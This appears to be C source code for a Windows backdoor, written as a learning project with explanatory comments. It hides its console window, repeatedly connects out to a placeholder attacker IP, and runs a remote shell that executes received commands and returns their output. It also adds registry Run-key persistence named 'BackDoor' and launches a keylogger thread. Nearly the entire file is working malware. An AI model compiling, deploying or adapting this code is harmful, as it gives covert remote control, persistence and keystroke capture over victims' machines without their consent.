//Create connection with our server (inside a main function)
//create a shell ffunction (wait for incoming command and iteerate over certain options)
//automaticaly start program when machine is rebooted
//start/spawn other programs
//navigation through different directories
//implementing keylogger to out backdoor

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size))      //used inside the shell()

int sock;      //used in the WinMain() function

int bootRun()
{
	char err[128] = "ERROR_CODE-0xc0000001(Failed)...........\n";
	char suc[128] = "PERSISTANCE_CREATED_SUCCESSFULLY!!!!!!!!!! \n";                //Created Persistance At :  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;
	
	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if(pathLen == 0)
	{
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	
	HKEY NewVal;
	
	if(RegOpenKey(HKEY_CURRENT_USER ,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if(RegSetValueEx(NewVal, TEXT("BackDoor"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}

char *
str_cut(char str[], int slice_from, int slice_to)
{
	if(str[0] == '\0')
		return NULL;
	
	char *buffer;
	size_t str_len, buffer_len;
	
	if(slice_to < 0 && slice_from > slice_to)
	{
		str_len = strlen(str);
		if(abs(slice_to) > str_len - 1)
			return NULL;
		
		if(abs(slice_from) > str_len)
			slice_from = (-1) * str_len;
		
		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);
	}
	else if(slice_from >= 0 && slice_to > slice_from)
	{
		str_len = strlen(str);
		
		if(slice_from > str_len - 1)
			return NULL;
		
		buffer_len = slice_to - slice_from;
		str += slice_from;
	}
	else
		return NULL;
	
	buffer = calloc(buffer_len, sizeof(char));
	strncpy(buffer, str, buffer_len);
	return buffer;
}

//receive the commands, execute them and send back the output
void Shell(){
	char buffer[1024];      //to use the actual commands from the server
	char container[1024];   //
	char total_response[18384];  //
	
	while(1){        //iterate for ever until something happens
		jump:
			bzero(buffer, sizeof(buffer));      //exactly the same function as memset usable for linux
			bzero(container, sizeof(container));
			bzero(total_response, sizeof(total_response));
			recv(sock, buffer, 1024, 0);        //to receive the commands from the server
			
			if(strncmp("cd ", buffer, 3) == 0)
			{
				chdir(str_cut(buffer, 3, 100));
			}
			else if(strncmp("beginning", buffer, 9) == 0)
			{
				HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
				goto jump;
			}
			else if(strncmp("persistance", buffer, 11) == 0)
			{
				bootRun();
			}
			else if (strncmp("exit", buffer, 4) == 0)      //(what to compare, whome to compare, how many strings are there)
			{
				closesocket(sock);
				WSACleanup();
				exit(0);
			}
			else
			{
				FILE *fp;       //file descriptor
				fp = _popen(buffer, "r");   //to open a file as a process, store the buffer inside the fp

				//getting back the responce from the victim to server

				while(fgets(container, 1024, fp) != NULL) 
				{
					strcat(total_response, container);
				}
				send(sock, total_response, sizeof(total_response), 0);
				fclose(fp);   //closing the file descriptor
			}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)          
{
	HWND stealth;        //HWND = handle for the window
	AllocConsole();       //allocate the new console to the calling process and don't need any parameters
	stealth = FindWindowA("ConsoleWindowClass", NULL);             //retrieves a handle to top level window (class name, window name = null)
	
	ShowWindow(stealth, 0);         //whether we want to open up our window (handle to the window = stealth, nCmdShow = 0)
	

	//making socket to make a connection

	struct sockaddr_in ServAddr;     //sockaddr_in = structure name,  servAddr = server address
	unsigned short ServPort;          //defining cause we are going to need a ip address and port to connect to our backdoor
	char *ServIP;                 //pointer
	WSADATA wsaData;             //WSADATA is a structure that contains info about the windows socket
	

	//ip and available port of the kali machine
	
	ServIP = "ATTACKER_MACHINE_IP_ADDRESS";          
	ServPort = ATTACKER_MACHINE_AVAILABLE_PORT;
	

	//checks whetherthe result of this function is zaero to not,

	if(WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){                  //WSAStartup allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation.
		exit(1);
	}
	
	sock = socket(AF_INET, SOCK_STREAM, 0);        //AF_INET is used to make connection, SOCK_STREAM uses TCP to make the threeway handshake
	

	//define the different parameters that the server address take that  because it is a part of server address

	memset(&ServAddr, 0, sizeof(ServAddr));        //clears the variables with zero
	ServAddr.sin_family = AF_INET;          //already explained to be IPv4 connection
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);   //actual address of our server, inet_addr() used to convert string into ip form
	ServAddr.sin_port = htons(ServPort);       //htons() is used to converts the unsigned short integer hostshort from host byte order to network byte order.
	
	start:  //start is a checkpoint try to connect to the victim every 10 seconds
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){     //connect = to perform the connection
		Sleep(10);
		goto start;
	}
	MessageBox(NULL, TEXT("Your System Has Been Taken Over!!!!!!"), TEXT("Windows Installer"), MB_OK, MB_ICONERROR);
	Shell();    //receive the commands, execute them and send back the output
}
